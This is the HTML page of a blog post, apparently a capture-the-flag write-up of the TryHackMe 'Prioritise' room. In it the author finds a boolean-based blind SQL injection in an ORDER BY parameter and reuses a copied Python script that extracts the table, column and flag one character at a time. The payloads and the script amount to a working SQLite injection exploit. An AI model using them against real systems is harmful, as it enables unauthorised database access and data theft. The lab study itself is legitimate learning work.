@@ -1,0 +1,321 @@
+<!DOCTYPE html>
+<html lang="ro-ro"><head><meta charset="utf-8">
+<meta http-equiv="content-type" content="text/html">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title itemprop="name">Prioritise | Cyber Blog-ul lui Novac</title>
+<meta property="og:title" content="Prioritise | Cyber Blog-ul lui Novac" />
+<meta name="twitter:title" content="Prioritise | Cyber Blog-ul lui Novac" />
+<meta itemprop="name" content="Prioritise | Cyber Blog-ul lui Novac" />
+<meta name="application-name" content="Prioritise | Cyber Blog-ul lui Novac" />
+<meta property="og:site_name" content="" />
+
+<meta name="description" content="">
+<meta itemprop="description" content="" />
+<meta property="og:description" content="" />
+<meta name="twitter:description" content="" />
+
+<meta property="og:locale" content="ro-ro" />
+<meta name="language" content="ro-ro" />
+
+  <link rel="alternate" hreflang="en" href="https://novaclearnscyber.github.io/blog/posts/prioritise/" title="" />
+
+
+
+
+
+    
+    
+    
+
+    <meta property="og:type" content="article" />
+    <meta property="og:article:published_time" content=2026-01-27T12:12:53Z />
+    <meta property="article:published_time" content=2026-01-27T12:12:53Z />
+    <meta property="og:url" content="https://novaclearnscyber.github.io/blog/posts/prioritise/" />
+
+    
+
+    
+
+    <script defer type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "Article",
+        "headline": "Prioritise",
+        "author": {
+        "@type": "Person",
+        "name": ""
+        },
+        "datePublished": "2026-01-27",
+        "description": "",
+        "wordCount":  477 ,
+        "mainEntityOfPage": "True",
+        "dateModified": "2026-01-27",
+        "image": {
+        "@type": "imageObject",
+        "url": ""
+        },
+        "publisher": {
+        "@type": "Organization",
+        "name": "Cyber Blog-ul lui Novac"
+        }
+    }
+    </script>
+
+
+<meta name="generator" content="Hugo 0.152.2">
+
+    
+    <meta property="og:url" content="https://novaclearnscyber.github.io/blog/posts/prioritise/">
+  <meta property="og:site_name" content="Cyber Blog-ul lui Novac">
+  <meta property="og:title" content="Prioritise">
+  <meta property="og:description" content="Description:
+“We have this new to-do list application, where we order our tasking based on priority! Is it really all that secure, though…?”
+i checked the website and add a new task on the to do list lets check a basic sql injection
+nothing special in the begining
+i created a new event in the tasklist and intercept it via burpsuite to look for something special
+the request seams normal
+i want tot try to modify the conent-length field may be we can buffer overflow this
+nothing special">
+  <meta property="og:locale" content="ro_ro">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:modified_time" content="2026-01-27T12:12:53+00:00">
+    <meta property="article:tag" content="Note">
+    <meta property="article:tag" content="Journal">
+    <meta property="article:tag" content="CyberStuff">
+
+
+    
+    
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Prioritise">
+  <meta name="twitter:description" content="Description:
+“We have this new to-do list application, where we order our tasking based on priority! Is it really all that secure, though…?”
+i checked the website and add a new task on the to do list lets check a basic sql injection
+nothing special in the begining
+i created a new event in the tasklist and intercept it via burpsuite to look for something special
+the request seams normal
+i want tot try to modify the conent-length field may be we can buffer overflow this
+nothing special">
+
+
+    
+
+    <link rel="canonical" href="https://novaclearnscyber.github.io/blog/posts/prioritise/">
+    <link href="https://novaclearnscyber.github.io/blog/style.min.e390ba7da26222f4dc42a349955d76dbbe44e5ce2535a43de5a70633a0a9ec3c.css" rel="stylesheet">
+    <link href="https://novaclearnscyber.github.io/blog/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
+
+    
+    <link rel="apple-touch-icon" sizes="180x180" href="https://novaclearnscyber.github.io/blog/icons/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://novaclearnscyber.github.io/blog/icons/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://novaclearnscyber.github.io/blog/icons/favicon-16x16.png">
+    <link rel="mask-icon" href="https://novaclearnscyber.github.io/blog/icons/safari-pinned-tab.svg">
+    <link rel="shortcut icon" href="https://novaclearnscyber.github.io/blog/favicon.ico">
+
+
+
+
+<link rel="manifest" href="https://novaclearnscyber.github.io/blog/site.webmanifest">
+
+<meta name="msapplication-config" content="/blog/browserconfig.xml">
+<meta name="msapplication-TileColor" content="#2d89ef">
+<meta name="theme-color" content="#434648">
+    <meta name="color-scheme" content="light dark">
+
+    
+    <link rel="icon" type="image/svg+xml" href="https://novaclearnscyber.github.io/blog/icons/favicon.svg">
+
+    
+    
+    
+</head>
+<body data-theme = "" class="notransition">
+
+<script src="https://novaclearnscyber.github.io/blog/js/theme.min.8961c317c5b88b953fe27525839672c9343f1058ab044696ca225656c8ba2ab0.js" integrity="sha256-iWHDF8W4i5U/4nUlg5ZyyTQ/EFirBEaWyiJWVsi6KrA="></script>
+
+<div class="navbar" role="navigation">
+    <nav class="menu" aria-label="Main Navigation">
+        <a href="https://novaclearnscyber.github.io/blog/" class="logo">
+            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" 
+viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" 
+stroke-linejoin="round" class="feather feather-home">
+<title></title>
+<path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
+<polyline points="9 22 9 12 15 12 15 22"></polyline>
+</svg>
+        </a>
+        <input type="checkbox" id="menu-trigger" class="menu-trigger" />
+        <label for="menu-trigger">
+            <span class="menu-icon">
+                <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7L3.40726 7"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488L3.49301 3.51488"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"></path><path stroke-linecap="round" stroke-linejoin="round" d="M0.5 12.5V1.5C0.5 0.947715 0.947715 0.5 1.5 0.5H12.5C13.0523 0.5 13.5 0.947715 13.5 1.5V12.5C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C0.947715 13.5 0.5 13.0523 0.5 12.5Z"></path></svg>
+            </span>
+        </label>
+
+        <div class="trigger">
+            <ul class="trigger-container">
+                
+                
+                <li class="menu-separator">
+                    <span>|</span>
+                </li>
+                
+                
+            </ul>
+            <a id="mode" href="#">
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+            </a>
+        </div>
+    </nav>
+</div>
+
+<div class="wrapper post">
+    <main class="page-content" aria-label="Content">
+        <article>
+            <header class="header">
+                <h1 class="header-title">Prioritise</h1>
+                
+                
+                
+                <div class="post-meta">
+                    <time datetime="2026-01-27T12:12:53&#43;00:00" itemprop="datePublished"> Jan 27, 2026 </time>
+                </div>
+                
+            </header>
+            
+            <div class="page-content">
+                <p>Description:<br>
+&ldquo;We have this new to-do list application, where we order our tasking based on priority! Is it really all that secure, though&hellip;?&rdquo;</p>
+<p>i checked the website and add a new task on the to do list <img src="https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020260126120647.png" alt=""><br>
+lets check a basic sql injection<br>
+<img src="https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020260126120808.png" alt=""><br>
+nothing special in the begining<br>
+<img src="https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020260127055947.png" alt=""><br>
+i created a new event in the tasklist and intercept it via burpsuite to look for something special<br>
+<img src="https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020260127060055.png" alt=""><br>
+the request seams normal<br>
+i want tot try to modify the conent-length field may be we can buffer overflow this<br>
+<img src="https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020260127060232.png" alt=""><br>
+nothing special</p>
+<p>OK SOMETHING SPECIAL HAPPENS WHEN we try to change the order parameter ,<br>
+<img src="https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020260127060600.png" alt=""><br>
+<img src="https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020260127060609.png" alt=""><br>
+we can modify the order parameter as we want</p>
+<p>I setted the value of order to:<br>
+<code>  title%20DESC%20--  </code><br>
+and get the following<br>
+<img src="https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020260127060725.png" alt=""><br>
+ok cool i think we encounter a order by sql injection :<br>
+<a href="https://portswigger.net/support/sql-injection-in-the-query-structure">https://portswigger.net/support/sql-injection-in-the-query-structure</a></p>
+<p>to check bbeter for a msql injection i tried the following payload :<code> http://10.64.190.116/?order=(CASE%20WHEN%20(1=1)%20THEN%20title%20ELSE%20date%20END);%20--</code></p>
+<p><img src="https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020260127063021.png" alt=""><br>
+Since the application is vulnerable to boolean-based blind SQL injection, we can manually extract some initial information needed for the flag.</p>
+<p>For the next four sections, we will be using the payloads from this awesome repo: <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md</a></p>
+<p>since i dont know how to write python for and now , and i dont have time to invest in this rn i found this scipt in this write up :<br>
+<a href="https://medium.com/@lorenzomoulin/tryhackme-prioritise-15ef05623e48">https://medium.com/@lorenzomoulin/tryhackme-prioritise-15ef05623e48</a></p>
+<pre tabindex="0"><code>import requests  
+import threading  
+  
+chars = [chr(i) for i in range(33, 127)]  
+  
+s = requests.Session()  
+  
+url = &#34;http://&lt;IP&gt;/&#34;  
+  
+ok = s.get(url + r&#34;?order=(CASE%20WHEN%20(1=1)%20THEN%20title%20ELSE%20date%20END);%20--&#34;)  
+ok = ok.content  
+  
+ans = [&#39;&#39; for i in range(38)]  
+  
+table_name = &#34;&#34;  
+column_name = &#34;&#34;  
+flag = &#34;&#34;  
+  
+def do_column_name(i: int, u: str, c: str):  
+    payload = f&#34;&#34;&#34;?order=(CASE%20WHEN%20(SELECT%20substr(name,%20{i},%201)%20FROM%20pragma_table_info(&#39;{table_name}&#39;))=%27{c}%27%20THEN%20title%20ELSE%20date%20END);%20--&#34;&#34;&#34;  
+    return s.get(u+payload)  
+  
+def do_table_name(i: int, u: str, c: str):  
+    payload = f&#34;&#34;&#34;?order=(CASE%20WHEN%20(SELECT%20substr(name,%20{i},%201)%20FROM%20sqlite_schema%20WHERE%20type%20=&#39;table&#39;%20LIMIT%201%20OFFSET%201)=%27{c}%27%20THEN%20title%20ELSE%20date%20END);%20--&#34;&#34;&#34;  
+    return s.get(u+payload)  
+  
+def do_get_flag(i: int, u: str, c: str):  
+    payload = f&#34;&#34;&#34;?order=(CASE%20WHEN%20(SELECT%20substr({column_name},%20{i},%201)%20FROM%20{table_name})=%27{c}%27%20THEN%20title%20ELSE%20date%20END);%20--&#34;&#34;&#34;  
+    return s.get(u+payload)  
+  
+def tgt(i: int):  
+    for c in chars:  
+        fail = True  
+        while fail:  
+            try:  
+                if action == &#34;flag&#34;:  
+                    response = do_get_flag(i, url, c)  
+                elif action == &#34;table&#34;:  
+                    response = do_table_name(i, url, c)  
+                else:  
+                    response = do_column_name(i, url, c)  
+            except:  
+                continue  
+            else:  
+                fail = False  
+        if response.content == ok:  
+            ans[i-1] = c  
+            break  
+  
+actions = [&#34;table&#34;, &#34;column&#34;, &#34;flag&#34;]  
+for action in actions:  
+    threads = list()  
+  
+    for j in range(38):  
+        t = threading.Thread(target=tgt, args=(j+1, ))  
+        t.start()  
+        threads.append(t)  
+  
+    for t in threads:  
+        t.join()  
+    print(f&#34;action: {action}&#34;)  
+    print(&#39;&#39;.join(ans))  
+    if action == &#34;table&#34;:  
+        table_name = &#39;&#39;.join(ans)  
+    elif action == &#34;column&#34;:  
+        column_name = &#39;&#39;.join(ans)  
+    else:  
+        flag = &#39;&#39;.join(ans)  
+    ans = [&#39;&#39; for i in range(38)]
+    
+</code></pre><p>since it fells quite like cheating to do this i gonna try to explain the best i can what does the scirpt<br>
+ok so for what i get after reading the sciprt in few time , it kinda brute forces the name of the table of the flag , being &ldquo;secret_flag&rdquo; after that it bruteforces the name of the column being &ldquo;flag_value&rdquo; and the in display it .<br>
+<img src="https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020260127071247.png" alt=""><br>
+and hooray we find the flag</p>
+
+            </div>
+        </article></main>
+</div>
+<footer class="footer">
+    <span class="footer_item"> </span>
+    &nbsp;
+
+    <div class="footer_social-icons">
+</div>
+    <small class="footer_copyright">
+        © 2026 .
+        
+    </small>
+</footer>
+
+
+
+
+
+
+
+    
+    <script src="https://novaclearnscyber.github.io/blog/js/main.min.4ee188e1744c19816e95a540b2650ed9f033ea0371e74eac8e717355cfca8741.js" integrity="sha256-TuGI4XRMGYFulaVAsmUO2fAz6gNx506sjnFzVc/Kh0E="></script>
+
+    
+
+</body>
+</html>
